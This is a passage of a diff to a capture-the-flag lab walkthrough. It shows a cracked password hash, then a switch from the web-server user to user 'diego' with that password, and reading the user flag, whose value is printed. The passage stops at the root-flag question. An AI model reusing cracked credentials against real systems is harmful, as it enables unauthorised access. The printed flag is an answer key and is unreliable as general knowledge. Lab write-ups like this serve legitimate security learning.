@@ -684,5 +684,20 @@ $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1:sandiegocalifornia
 > The password revealed belongs to Diego! so lets try that now.
 
 ```
+www-data@ip-10-112-186-157:/opt$ su diego
+Password:
+diego@ip-10-112-186-157:/opt$ ^C
+diego@ip-10-112-186-157:/opt$ cd /
+diego@ip-10-112-186-157:/$ cd home/diego/
+diego@ip-10-112-186-157:~$ ls
+user.txt
+diego@ip-10-112-186-157:~$ cat user.txt
+45edaec653ff9ee06236b7ce72b86963
+```
+
+> [!important]
+> What is the root flag?
+
+```
 
 ```
